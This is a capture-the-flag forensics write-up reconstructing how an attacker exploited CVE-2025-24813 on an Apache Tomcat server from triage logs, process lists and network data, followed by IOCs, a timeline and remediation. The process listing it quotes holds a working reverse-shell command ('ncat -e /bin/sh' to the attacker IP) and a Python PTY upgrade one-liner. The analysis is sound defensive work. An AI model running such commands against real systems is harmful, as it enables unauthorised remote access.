# Triage of the Broken Shrine - Writeup

**Challenge**: Triage of the Broken Shrine
**Category**: Forensics
**Difficulty**: Easy
**CTF**: HackTheBox Neurogrid CTF 2025
**Points**: 1000 (6 flags × 150-200 points each)
**Completion Date**: 2025-11-20

## Challenge Description

Summoned to the stone outpost of Minamori, Shiori finds its once-busy shrine server sitting cold, its guardians gone, its walls carved with the faint scratches of an intruder's passage. The system hosted a modest web shrine, but something slipped through its doors under moonlight and left only triage logs in its wake. Your task mirrors Shiori's: sift through the Linux triage data, follow the distorted footprints across access logs and process remnants, and uncover how the shrine was breached.

## Flags Captured

1. **Web application and port**: `apache-tomcat-9.0.90:8080` (200 points)
2. **Malicious actor IP**: `192.168.153.128` (150 points)
3. **Malicious file name**: `gdiju.session` (150 points)
4. **CVE exploited**: `CVE-2025-24813` (150 points)
5. **Malicious file folder**: `/opt/apache-tomcat-9.0.90/webapps/ROOT` (150 points)
6. **Malicious process ID**: `4233` (200 points)

## Analysis Process

### 1. Initial Reconnaissance

The challenge provided a Linux triage collection with the following structure:
- `bodyfile/` - Timeline data
- `hash_executables/` - Hash values of executables
- `live_response/` - Live system response data
- `[root]/` - Root filesystem capture
- `system/` - System information
- `uac.log` - UAC collection log

### 2. Network Analysis

**File analyzed**: `live_response/network/ss_-tanp.txt`

Found suspicious network connections:
```
ESTAB  0      0  192.168.153.131:56400  192.168.153.128:1234
users:(("bash",pid=4238,fd=3),("python3",pid=4237,fd=3),("sh",pid=4235,fd=3),("ncat",pid=4233,fd=3))
```

This revealed a **reverse shell connection** to `192.168.153.128:1234`.

**File analyzed**: `live_response/network/ss_-tlnp.txt`

Found Java application listening on port 8080:
```
LISTEN 0  100  *:8080  *:*  users:(("java",pid=3318,fd=45))
```

### 3. Process Analysis

**File analyzed**: `live_response/process/ps_auxwww.txt`

Identified the web application:
```
root  3318  /usr/bin/java ... -Dcatalina.home=/opt/apache-tomcat-9.0.90 ...
  org.apache.catalina.startup.Bootstrap start
```

This confirmed **Apache Tomcat 9.0.90** running on port 8080.

Found the reverse shell command:
```
root  4233  ncat -e /bin/sh 192.168.153.128 1234
root  4235  /bin/sh
root  4237  python3 -c import pty; pty.spawn("/bin/bash")
root  4238  /bin/bash
```

Process tree analysis showed ncat (PID 4233) was spawned by the Java process, indicating the attacker executed commands through a web shell.

### 4. Access Log Analysis

**File analyzed**: `[root]/opt/apache-tomcat-9.0.90/logs/localhost_access_log.2025-11-17.txt`

The access log showed extensive reconnaissance activity from `192.168.153.128` starting at 19:46:42, including:
- Directory scanning
- Common file enumeration
- Manager/host-manager probing

**Critical finding** at 19:50:32:
```
192.168.153.128 - - [17/Nov/2025:19:50:32 +0200] "PUT /gdiju.session HTTP/1.1" 201 -
```

A **PUT request** uploaded `gdiju.session` with HTTP status **201 (Created)**, indicating successful file upload.

### 5. Vulnerability Identification

The evidence pointed to CVE-2025-24813:

**CVE-2025-24813** - Apache Tomcat Session Deserialization RCE
- **CVSS Score**: 9.8 (Critical)
- **Affected Versions**: Apache Tomcat 9.0.0-M1 to 9.0.98 (includes 9.0.90)
- **Attack Vector**:
  - Improper handling of file-based session persistence
  - Default servlet with write operations enabled
  - Malicious `.session` files uploaded via HTTP PUT
  - Files deserialized by server, leading to RCE

**Attack Chain**:
1. Attacker uploads malicious `gdiju.session` file via PUT request
2. Tomcat deserializes the session file
3. Malicious code executes with server privileges
4. Attacker spawns reverse shell using `ncat`
5. Shell upgraded with Python PTY for interactive access

### 6. File Location

The malicious file was uploaded to:
```
/opt/apache-tomcat-9.0.90/webapps/ROOT/gdiju.session
```

Although the file was not present in the triage data (likely deleted after exploitation), the access log confirmed its creation in the ROOT web application directory.

## Indicators of Compromise (IOCs)

- **Malicious IP**: 192.168.153.128
- **Malicious File**: gdiju.session
- **Malicious Processes**:
  - PID 4233: ncat (reverse shell)
  - PID 4235: /bin/sh
  - PID 4237: python3 (PTY upgrade)
  - PID 4238: /bin/bash
- **Network Connection**: 192.168.153.131:56400 → 192.168.153.128:1234
- **Attack Time**: 2025-11-17 19:50:32 +0200

## Timeline of Attack

| Time | Event |
|------|-------|
| 19:46:42 | Reconnaissance begins from 192.168.153.128 |
| 19:46:42-19:47:25 | Extensive directory/file enumeration |
| 19:50:32 | **PUT /gdiju.session** - Malicious file uploaded |
| 19:50:xx | Reverse shell established (ncat spawned) |
| 19:51:xx | Shell upgraded to interactive bash via Python PTY |

## Remediation

1. **Immediate**:
   - Upgrade Apache Tomcat to 9.0.99 or later
   - Disable write operations on default servlet (`readonly=true`)
   - Block IP 192.168.153.128

2. **Short-term**:
   - Review all PUT/DELETE HTTP method configurations
   - Implement strict file upload validation
   - Monitor for `.session` file uploads
   - Review all active processes for suspicious activity

3. **Long-term**:
   - Implement application whitelisting
   - Deploy network segmentation
   - Enable comprehensive logging and monitoring
   - Regular vulnerability assessments

## Key Lessons

1. **Default configurations matter**: The vulnerability required the non-default configuration of write-enabled default servlet
2. **Multi-layer analysis**: Success required correlating network data, process lists, and access logs
3. **Timeline reconstruction**: Proper timeline analysis revealed the complete attack chain
4. **Latest CVEs**: CVE-2025-24813 is a recent vulnerability demonstrating the importance of staying current with security advisories

## Tools Used

- Standard Linux utilities (grep, find, ls, awk)
- Log analysis
- Process tree analysis
- Network connection analysis
- Web search for CVE research

## References

- [CVE-2025-24813 Analysis & PoC](https://d3voo.com/cve-analysis/cve/exploring-cve-2025-24813-remote-code-execution-via-tomcat-session-deserialization)
- [Apache Tomcat Security Vulnerabilities](https://tomcat.apache.org/security-9.html)
- [Fidelis Security - CVE-2025-24813 Exploit](https://fidelissecurity.com/vulnerabilities/cve-2025-24813/)
